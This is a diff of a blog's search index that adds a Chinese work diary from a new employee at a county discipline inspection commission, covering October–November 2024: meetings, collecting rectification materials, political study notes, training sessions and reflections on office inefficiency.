+<h2 id="2024-10-18"><a href="#2024-10-18" class="headerlink" title="2024.10.18"></a>2024.10.18</h2><p>上午填了两张表，日常监督表格注意事项：1.单位名称填写全称，从省开始写；2.调研表方案或者报告全文复制；3.有问题根据政策写，根据xxx，xxx干了xxx。昨晚有同事加班到11点，不知道未来一个月我们组的工作是什么情况。</p>
+<p>下午也没有什么事情，就学习业务书籍，感觉同事们都很热心，有什么问题都会热心的解答。甚至下午来的技术人员会从下载浏览器开始教我登录内网基础班平台，哈哈哈，感觉很有意思。</p>
+<blockquote>
+<p>同事们都很好，人热心。</p>
+</blockquote>
+<h2 id="2024-10-21"><a href="#2024-10-21" class="headerlink" title="2024.10.21"></a>2024.10.21</h2><p>收以案促改材料。明天去政协开会。</p>
+<blockquote>
+<p>期待明天的到来。</p>
+</blockquote>
+<h2 id="2024-10-22"><a href="#2024-10-22" class="headerlink" title="2024.10.22"></a>2024.10.22</h2><p>上午学习二十届三中全会精神，学习《中共中央关于进一步全面深化改革、推进中国式现代化的决定》、《中国共产党第二十届中央委员会第三次全体会议公报》，并写了读后感。</p>
+<p>下午去政协开以案促改会议。</p>
+<blockquote>
+<p>逐步进入正轨，哈哈哈。</p>
+</blockquote>
+<h2 id="2024-10-23"><a href="#2024-10-23" class="headerlink" title="2024.10.23"></a>2024.10.23</h2><p>上午学习二十届三中全会精神，去党校考试，并且认识了公安局警令部主任，最美基层民警LXG，初心不改，坚守大山，我感觉他们都很伟大，能够真真正正的接触到群众的。</p>
+<p>进一步深化改革的总目标：<br>1.继续完善和发展中国特色社会主义制度。<br>2.推进国家治理体系和治理能力现代化。<br>3.到2035年，全面建成高水平社会主义市场经济体制。<br>4.中国特色社会主义制度更加完善。<br>5.基本实现国家治理体系和治理能力现代化。<br>6.基本实现社会主义现代化。</p>
+<p>完善城乡融合发展体制机制的主要部署：<br>1.健全推进新型城镇化体制机制。<br>2.巩固和完善农村基本经营制度。<br>3.完善强农惠农富农支持制度。<br>4.深化土地制度改革。<br>5.统筹新型工业化、新型城镇化和乡村全面振兴。<br>6.促进城乡要素平等交换、双向流动。</p>
+<p>把改革推向前进的必要性（六个必然要求）：<br>1.坚持和完善中国特色社会主义制度、推进国家治理体系和治理能力现代化的必然要求。<br>2.贯彻新发展理念、更好适应我国社会主要矛盾变化的必然要求。<br>3.坚持以人民为中心、让现代化建设成果更多更公平惠及全体人民的必然要求。<br>4.应对重大风险挑战、推动党和国家事业行稳致远的必然要求。<br>5.推动构建人类命运共同体、在百年变局加速演进中赢得战略主动的必然要求。<br>6.深入推进新时代党的建设新的伟大工程、建设更加坚强有力的马克思主义政党的必然要求。</p>
+<p>进一步全面深化改革必须坚持的六个原则：<br>1.坚持党的全面领导。<br>2.坚持以人民为中心。<br>3.坚持守正创新。<br>4.坚持以制度建设为主线。<br>5.坚持全面依法治国。<br>6.坚持系统观念。</p>
+<p>下午去3点去人大开以案促改会议，下午去党校开以案促改会议。感觉党校的同志都很热情，讲的时候也都在认真的记笔记，不是敷衍了事，向他们学习。</p>
+<blockquote>
+<p>1.很多表格都没有模板和格式，每个单位交上来的都不一样，感觉这样工作效率会低很多。</p>
+<p>2.需要联系的人很多，有点抵触打电话，有待加强。</p>
+<p>3.去开会有很多领导，都很热情，隆重介绍，一堆人跟在我后面，很不适应，感觉别扭。</p>
+<p>4.其他单位的领导可能对纪委监委的工作比我都熟悉，值得学习。</p>
+</blockquote>
+<h2 id="2024-10-24"><a href="#2024-10-24" class="headerlink" title="2024.10.24"></a>2024.10.24</h2><p>8点半去社会工作部开以案促改会议。之后收六个单位违规吃喝的情况说明，以案整改情况。</p>
+<blockquote>
+<p>1.注意纸质版和电子版是否都需要</p>
+<p>2.通知好是否需要盖章</p>
+<p>3.沟通的艺术</p>
+</blockquote>
+<h2 id="2024-10-25"><a href="#2024-10-25" class="headerlink" title="2024.10.25"></a>2024.10.25</h2><p>今天比较忙碌，晚上五点半开会分配任务，关于巡视巡察整改专项工作，设计对四个单位进行谈话，所有单位交促改材料、党纪学习教育材料，对四个单位（人大、政协、党校、档案馆）进行谈话等等。</p>
+<blockquote>
+<p>1.电脑设备太差，影响效率</p>
+<p>2.开会效果差，感觉材料应该先发给参会人。</p>
+<p>3.很多需要的东西格式、模板都没有统一标准，很麻烦。</p>
+<p>4.很多工作牵扯很多单位，需要配合，需要顾及其他单位，不利于开展工作。</p>
+</blockquote>
+<h2 id="2024-10-26"><a href="#2024-10-26" class="headerlink" title="2024.10.26"></a>2024.10.26</h2><p>今天很忙碌，很多收的材料都要补充其他材料，好在9个单位都很配合工作，县委办公室事情多，材料不能按时交。。。</p>
+<p>今天中午跟YWZ和LXB一起加班，我们这批刚刚入职的在工作中也渐渐熟悉起来，之前和他俩没什么交流，今天一起吃了饭，熟悉起来。</p>
+<blockquote>
+<p>1.谨慎。因违纪违法和违纪这个关键词搞错而复工，耽误了时间。</p>
+<p>2.感觉很多地方要求不明确，都要靠打听，可能本来就没有要求吧</p>
+</blockquote>
+<h2 id="2024-10-27"><a href="#2024-10-27" class="headerlink" title="2024.10.27"></a>2024.10.27</h2><p>约谈情况表最后一栏需要填写以后怎么做。补充日常监督内容。</p>
+<blockquote>
+<p>1.沟通的艺术（和县委办公室的负责人交流）</p>
+</blockquote>
+<h2 id="2024-10-28"><a href="#2024-10-28" class="headerlink" title="2024.10.28"></a>2024.10.28</h2><p>省委巡视和以案促改工作告一段落，这段时间收了十个单位的以案促改材料（照片、会议记录、班子成员自我剖析材料、台账、佐证材料、建章立制）。十个单位的党纪学习教育材料（会议记录、照片、方案、通知），违规吃喝整改材料和制度（人大、政协、办公室、党校、机关事务中心），四个单位的谈话（人大、政协、档案馆、党校），党校青年干部培训班的通知文件、培训名单、课程表、培训照片、体现习近平关于加强作风建设的相关内容。县委办24年关于第一议题的所有会议记录。</p>
+<blockquote>
+<p>感觉还是很有成就感的。</p>
+</blockquote>
+<h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024.10.29"></a>2024.10.29</h2><p>今天发了5张问题线索分办表，可能要办案子了吧，也想挑战一下自己。</p>
+<p>人大、政协、党校、县委办、机关事务中心的违规吃喝。</p>
+<blockquote>
+<p>感觉很多东西都没有明确的规定，比如台账的格式、内容；比如需要填写的签和表无固定格式；所有东西都要靠打听，感觉很难受。</p>
+</blockquote>
+<h2 id="2024-10-30"><a href="#2024-10-30" class="headerlink" title="2024.10.30"></a>2024.10.30</h2><p>制作了签、表、报告</p>
+<h2 id="2024-10-31"><a href="#2024-10-31" class="headerlink" title="2024.10.31"></a>2024.10.31</h2><p>政协来盖章（晋升材料）。</p>
+<h2 id="2024-11-01"><a href="#2024-11-01" class="headerlink" title="2024.11.01"></a>2024.11.01</h2><p>写专项行动报告，人大盖章、军工企业办事处盖章。</p>
+<p>今天可以转党员关系啦。</p>
+<h2 id="2024-11-04"><a href="#2024-11-04" class="headerlink" title="2024.11.04"></a>2024.11.04</h2><p>上午八点半培训。张黎《强化基层“小微权力”管控，筑牢基层执政根基》，申甲佳《如何开展留置内审的谈话工作》</p>
+<h2 id="2024-11-05"><a href="#2024-11-05" class="headerlink" title="2024.11.05"></a>2024.11.05</h2><p>无事</p>
+<h2 id="2024-11-06"><a href="#2024-11-06" class="headerlink" title="2024.11.06"></a>2024.11.06</h2><p>无事</p>
+<h2 id="2024-11-07"><a href="#2024-11-07" class="headerlink" title="2024.11.07"></a>2024.11.07</h2><p>下午三点，关于召开群众身边不正之风和腐败问题集中整治工作座谈推进会议</p>
+<h2 id="2024-11-08"><a href="#2024-11-08" class="headerlink" title="2024.11.08"></a>2024.11.08</h2><p>上午8:30-11:00党校四楼培训</p>
+<h2 id="2024-11-11"><a href="#2024-11-11" class="headerlink" title="2024.11.11"></a>2024.11.11</h2><p>金融整治工作。个人自查表、单位自查表、省辖市情况汇总表（表1到表5）、零报告汇总表。</p>
+<h2 id="2024-11-12"><a href="#2024-11-12" class="headerlink" title="2024.11.12"></a>2024.11.12</h2><p>金融整治纸质版、电子版交八室了。</p>
+<h2 id="2024-11-13"><a href="#2024-11-13" class="headerlink" title="2024.11.13"></a>2024.11.13</h2><p>无事</p>
+<h2 id="2024-11-14"><a href="#2024-11-14" class="headerlink" title="2024.11.14"></a>2024.11.14</h2><p>吃潮汕火锅，爬燕山</p>
+<h2 id="2024-11-15"><a href="#2024-11-15" class="headerlink" title="2024.11.15"></a>2024.11.15</h2><p>无事</p>
+<h2 id="2024-11-18"><a href="#2024-11-18" class="headerlink" title="2024.11.18"></a>2024.11.18</h2><p>上午八点半，强业务、促提升业务培训会。</p>
+<p>《财务账目审查与审计》王晓</p>
+<p>《农村集体经济三资管理》潘鹏</p>
+<h2 id="2024-11-19"><a href="#2024-11-19" class="headerlink" title="2024.11.19"></a>2024.11.19</h2><h2 id="2024-11-20"><a href="#2024-11-20" class="headerlink" title="2024.11.20"></a>2024.11.20</h2><p>写日常监督表（关于对机关事务中心开展违反中央八项规定精神的调研方案）</p>
+<h2 id="2024-11-21"><a href="#2024-11-21" class="headerlink" title="2024.11.21"></a>2024.11.21</h2><p>无事</p>
+<h2 id="2024-11-22"><a href="#2024-11-22" class="headerlink" title="2024.11.22"></a>2024.11.22</h2><p>无事</p>
+<h2 id="2024-11-25"><a href="#2024-11-25" class="headerlink" title="2024.11.25"></a>2024.11.25</h2><p>领关于纠治违规建设楼堂馆所、奢华装修问题的通知。</p>
 ]]></content>
       <categories>
-        <category>工具书</category>
+        <category>工作</category>
       </categories>
       <tags>
-        <tag>实体法规</tag>
+        <tag>工作日志</tag>
       </tags>
   </entry>
 </search>
